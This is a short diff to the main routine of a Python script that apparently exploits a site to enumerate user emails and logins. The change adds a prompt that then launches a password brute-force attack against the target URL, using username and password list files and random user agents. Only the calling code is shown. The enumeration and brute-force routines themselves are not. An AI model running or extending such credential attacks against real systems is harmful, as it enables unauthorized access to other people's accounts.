@@ -36,6 +36,17 @@ if __name__ == '__main__':
         mmObj.xpltUserEmail()
         #mmObj.XptGetURemainder()
         mmObj.XptGetUsersLogin()
+        doBrute = input("Do you like to performe a brute force: y/n").lower()
+        if doBrute[0] == "y":
+            urllib3.disable_warnings()
+            bruteObj = Brute(results.url, results.random_agent)
+            bruteObj.CleanUrl()
+            bruteObj.RandomAgent()
+            bruteObj.DoBruteForce(results.users_file, results.password_file)
+        else:
+            print("[-] Thanks to use this tool.. issues are welcome..")
+            exit()
+
     if results.brute:
         answer = input("[+] Start brute force ? Y/n: ").lower()
         if answer[0] == "y":
@@ -46,5 +57,6 @@ if __name__ == '__main__':
             bruteObj.DoBruteForce(results.users_file, results.password_file)
         else:
             answer[0] == "n"
-            print("[+] Thanks to use this poor tool :(" )
+            print("[-] Thanks to use this tool.. issues are welcome..")
+            exit()
 
